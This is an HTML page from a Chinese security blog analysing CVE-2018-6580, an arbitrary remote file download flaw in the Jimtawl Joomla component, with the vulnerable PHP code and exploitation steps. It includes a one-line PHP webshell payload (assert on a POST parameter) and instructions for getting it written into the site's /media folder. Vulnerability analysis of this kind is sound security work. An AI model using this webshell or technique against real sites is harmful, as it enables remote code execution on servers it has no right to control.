@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="关于CVE-2018-6580其他Tips分析" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="本文分析一下CVE-2018-6580漏洞的产生原因" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2018-02-07/1" property="og:url">
+
+
+  <meta content="2018-02-07T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="CVE漏洞分析" property="article:section">
+  
+
+
+  
+
+  <title>关于CVE-2018-6580其他Tips分析</title>
+  <meta name="description" content="本文分析一下CVE-2018-6580漏洞的产生原因">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2018-02-07/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">关于CVE-2018-6580其他Tips分析</h1>
+      <p class="post-meta"><time datetime="2018-02-07T00:00:00+08:00" itemprop="datePublished">Feb 7, 2018</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>本文分析一下CVE-2018-6580漏洞的产生原因
+<!--more--></p>
+
+<h2 id="0x01-前言">0x01 前言</h2>
+
+<p>很久没有代码审计了，无意的逛着Exploit-DB看到了几个关于Joomla!的漏洞，想分析一下看看。</p>
+
+<p>审计环境：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>组件</th>
+      <th>组件版本</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Joomla</td>
+      <td>3.8.5</td>
+    </tr>
+    <tr>
+      <td>Apache</td>
+      <td>2.4</td>
+    </tr>
+    <tr>
+      <td>PHP</td>
+      <td>5.4</td>
+    </tr>
+    <tr>
+      <td>操作系统</td>
+      <td>Windows7</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="0x02-漏洞简介">0X02 漏洞简介</h2>
+
+<p>Exploit-DB地址：https://www.exploit-db.com/exploits/43958/</p>
+
+<p>该漏洞不是Joomla的漏洞，是其中一个组件的漏洞，名字叫“Jimtawl”，漏洞版本是：“2.2.5”</p>
+
+<ul>
+  <li>组件下载地址：http://janguo.de/lang-en/joomla-25-higher/jimtawl/pkg_jimtawl-2-2-5-current-r561-zip.raw</li>
+  <li>https://extensions.joomla.org/extension/jimtawl/</li>
+</ul>
+
+<p>Jimtawl代表网络上的一个电台。向访问者显示您的节目日历，节目详情，播放列表以及正在播放的人员。</p>
+
+<p><strong>功能如下：</strong></p>
+
+<ul>
+  <li>提供广播节目：广播时间，下一个广播日期，说明，团队，联系人，网站</li>
+  <li>介绍主持人和编辑的东西：名字，图片，描述</li>
+  <li>为当前节目安排和创建播放列表</li>
+  <li>呈现细分：标题，文字，音频，类别，流派，图像</li>
+  <li>导航程序日历</li>
+  <li>分段存档</li>
+  <li>模块“现在谁在空中”</li>
+  <li>支持Joomlas搜索</li>
+  <li>Podcast Feed</li>
+</ul>
+
+<p>它的漏洞产生原因是任意文件上传，你一定会觉得匪夷所思，Joomla这么成熟的项目，它们的组件会不会也比较安全？ You are wrong..</p>
+
+<h2 id="0x03-代码分析">0x03 代码分析</h2>
+
+<p>Exploit-DB上给出了一些简短的描述，但是这也足够了，我们可以通过URL找到漏洞对应的代码。</p>
+
+<p><code class="highlighter-rouge">index.php?option=com_jimtawl&amp;view=upload&amp;task=upload&amp;pop=true&amp;tmpl=component</code></p>
+
+<p>这个页面是用来上传文件地方。</p>
+
+<p><code class="highlighter-rouge">/components/com_jimtawl/models/media.php</code> 107 Lines :</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="o">....</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="nf">import</span><span class="p">(</span><span class="nv">$url</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span> <span class="nv">$path</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span>
+		
+		<span class="nx">jimport</span><span class="p">(</span><span class="s1">'joomla.filesystem.path'</span><span class="p">);</span>
+		<span class="nx">jimport</span><span class="p">(</span><span class="s1">'joomla.filesystem.file'</span><span class="p">);</span>
+		<span class="nv">$config</span> <span class="o">=</span> <span class="nx">JComponentHelper</span> <span class="o">::</span> <span class="na">getParams</span><span class="p">(</span><span class="s1">'com_jimtawl'</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">jimtawl_fileinfo</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">upload_dir</span> <span class="o">=</span> <span class="nx">JPath</span> <span class="o">::</span> <span class="na">clean</span><span class="p">(</span><span class="nx">JPATH_SITE</span> <span class="o">.</span> <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'upload_dir'</span><span class="p">,</span> <span class="s1">'/media/'</span><span class="p">));</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">is_local</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> 
+			<span class="nv">$ext</span> <span class="o">=</span> 	<span class="nb">strtolower</span><span class="p">(</span><span class="nx">JFile</span><span class="o">::</span><span class="na">getExt</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>
+			<span class="k">switch</span><span class="p">(</span><span class="nv">$ext</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="k">case</span> <span class="s1">'wav'</span><span class="o">:</span>
+					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_localfile</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
+					<span class="k">break</span><span class="p">;</span>
+				<span class="k">case</span> <span class="s1">'ogg'</span><span class="o">:</span>
+				<span class="k">case</span> <span class="s1">'mp3'</span><span class="o">:</span>
+					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_local_fileinfo</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_move_uploaded</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="p">);</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+			
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_remotefile</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_fileinfo_from_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'userfile'</span><span class="p">]);</span>
+				<span class="nb">unset</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'userfile'</span><span class="p">]);</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_move_uploaded</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_setMediaType</span><span class="p">();</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_import_media</span><span class="p">();</span>		
+	<span class="p">}</span>
+	<span class="o">......</span>
+</code></pre></div></div>
+
+<p>该方法主要是来处理上传逻辑的，可以看到一开始就先获取一些优先文件，例如：<code class="highlighter-rouge">wav,ogg,mp3</code>这类的会被分别调用<code class="highlighter-rouge">_get_localfile</code>方法去进行上传。</p>
+
+<p>我们主要关注的还是从<code class="highlighter-rouge">if($url)</code>开始：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_remotefile</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_fileinfo_from_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'userfile'</span><span class="p">]);</span>
+	<span class="nb">unset</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'userfile'</span><span class="p">]);</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_move_uploaded</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>跟踪一下<code class="highlighter-rouge">_get_remotefile</code>函数：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+      <span class="o">....</span>
+
+<span class="k">private</span> <span class="k">function</span> <span class="nf">_get_remotefile</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$info</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> <span class="c1">// 当我们的URL传递进来后先解析URL地址</span>
+		<span class="nv">$pathinfo</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]);</span> <span class="c1">// 获取URI</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$pathinfo</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">path</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">upload_dir</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"host"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span>
+			<span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"port"</span><span class="p">]))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"port"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span><span class="p">))</span>
+			<span class="nv">$info</span><span class="p">[</span><span class="s2">"port"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
+		<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"host"</span><span class="p">],</span> <span class="nv">$info</span><span class="p">[</span><span class="s2">"port"</span><span class="p">],</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="c1">// 连接远程服务器</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nb">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">"HEAD "</span> <span class="o">.</span> <span class="nv">$info</span><span class="p">[</span><span class="s2">"path"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">" HTTP/1.0</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="s2">"Host: "</span> <span class="o">.</span> <span class="nv">$info</span><span class="p">[</span><span class="s2">"host"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">.</span> <span class="s2">"Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">);</span>
+			<span class="k">do</span> <span class="p">{</span>
+				<span class="nv">$response</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+			<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nx">AND</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="s1">'content-length'</span><span class="p">)</span> <span class="o">===</span> <span class="kc">false</span><span class="p">);</span> <span class="c1">// 一直读取文件</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="s1">'content-length'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> <span class="c1">// 关闭连接 </span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="nv">$file_in</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>  <span class="c1">// 这里再次读取，其实可以用file_get_contents...</span>
+		<span class="nv">$file_out</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">path</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span> <span class="c1">// 重新打开一个文件描述符，准备将文件写入服务器</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$file_out</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$file_out</span><span class="p">,</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$file_in</span><span class="p">,</span> <span class="mi">4056</span><span class="p">));</span>  <span class="c1">// 读取 4056个字节并写入文件</span>
+			<span class="nb">fclose</span><span class="p">(</span><span class="nv">$file_out</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="nx">JError</span> <span class="o">::</span> <span class="na">raiseError</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">JText</span> <span class="o">::</span> <span class="na">_</span><span class="p">(</span><span class="s1">'Unable to open file '</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">path</span> <span class="p">));</span>
+		<span class="p">}</span>
+
+		<span class="nb">fclose</span><span class="p">(</span><span class="nv">$file_in</span><span class="p">);</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">extern</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">url</span> <span class="o">=</span> <span class="nv">$url</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="o">.......</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>上面简单分析了一下代码，逻辑不是很难，主要是我不是很了解这个cms的框架，只能看个大概了。</p>
+
+<h2 id="0x04-远程文件任意下载">0x04 远程文件任意下载</h2>
+
+<p>上面分析了这么多，这个洞到底出现在哪里呢？</p>
+
+<p>其实主要就是未对文件扩展名进行校验，其实他们是有校验方法的，只是没有调用的不是时候：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="o">....</span>
+<span class="k">private</span> <span class="k">function</span> <span class="nf">_setMediaType</span><span class="p">()</span> <span class="p">{</span>
+		<span class="c1">// is this audio, image, or not allowed?</span>
+		<span class="nv">$media_type</span> <span class="o">=</span> <span class="s2">"-1"</span><span class="p">;</span>
+		<span class="nv">$path_info</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+		<span class="nv">$extension</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$path_info</span><span class="p">[</span><span class="s2">"extension"</span><span class="p">]);</span>
+		<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mediatypes</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$mimetypes</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mediatypes</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="s1">'extensions'</span><span class="p">]);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span> <span class="nv">$mimetypes</span><span class="p">))</span> <span class="p">{</span>
+				<span class="nv">$media_type</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$media_type</span> <span class="o">==</span> <span class="s2">"-1"</span><span class="p">)</span>
+			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_info</span><span class="o">-&gt;</span><span class="na">media_type</span> <span class="o">=</span> <span class="nv">$media_type</span><span class="p">;</span>
+		<span class="c1">/// print_r($this-&gt;file_info);die;</span>
+		<span class="nv">$mediaTypeName</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mediatypes</span><span class="p">[</span><span class="nv">$media_type</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
+
+		<span class="k">return</span> <span class="nv">$mediaTypeName</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="o">....</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>这里是遍历了白名单扩展名，进行比较……</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x01.png" alt="上传页面" /></p>
+
+<p>利用上面的过程非常简单，只需要在URL Link中输入一个扩展名为PHP的远程文件，注意，它的代码必须是这样：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s1">'&lt;?php assert($_POST["test"]);?&gt;'</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>因为如果直接保存一句话木马，它还是会被我们的PHP环境解析，当然也可以将PHP的解析去掉 ~</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x02.png" alt="上传页面" /></p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x03.png" alt="上传页面" /></p>
+
+<p>在组件上提交这个URL：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x04.png" alt="上传页面" /></p>
+
+<p>当文件上传上去以后，我们就可以在<code class="highlighter-rouge">/media</code>文件夹下发现我们的文件了：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x05.png" alt="上传页面" /></p>
+
+<h2 id="0x05-总结">0x05 总结</h2>
+
+<p>这个漏洞只是提及了一个简单的远程文件下载漏洞，而在Exploit-DB上披露的是直接上传文件漏洞。我认为可以刷一个CVE，但是没必要了，贵在学习</p>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
